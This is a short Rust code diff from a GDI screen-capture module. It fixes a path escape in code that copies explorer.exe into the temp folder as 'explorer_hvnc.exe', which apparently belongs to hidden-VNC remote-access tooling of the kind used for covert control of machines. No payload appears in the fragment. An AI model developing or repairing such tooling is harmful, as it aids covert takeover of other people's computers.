@@ -108,7 +108,7 @@ impl CapturerGDI {
                 let len = winapi::um::sysinfoapi::GetWindowsDirectoryA(buffer.as_mut_ptr() as *mut i8, 260);
                 if len > 0 {
                     let windir = std::str::from_utf8(&buffer[..len as usize]).unwrap_or("");
-                    let source_path = format!("{}\explorer.exe", windir);
+                    let source_path = format!(r"{}\explorer.exe", windir);
                     let temp_dir = std::env::temp_dir();
                     let target_path = temp_dir.join("explorer_hvnc.exe");
                     let target_path_str = target_path.to_string_lossy().to_string();
